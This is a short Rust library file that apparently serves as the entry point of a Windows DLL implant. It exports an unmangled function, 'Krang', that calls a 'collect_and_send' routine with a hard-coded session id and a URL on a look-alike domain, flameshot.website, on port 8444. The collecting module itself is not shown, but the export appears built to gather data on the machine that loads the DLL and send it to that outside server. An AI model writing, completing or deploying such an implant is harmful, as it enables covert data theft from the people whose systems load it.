pub mod link_util;
pub mod collect;
//pub mod utils;

use crate::collect::collect_and_send;

#[unsafe(no_mangle)]
pub extern "system" fn Krang() {
    let session_id="yolo".to_string();
    let url="http://flameshot.website:8444/login.php".to_string();
    collect_and_send(1,session_id,url)
}
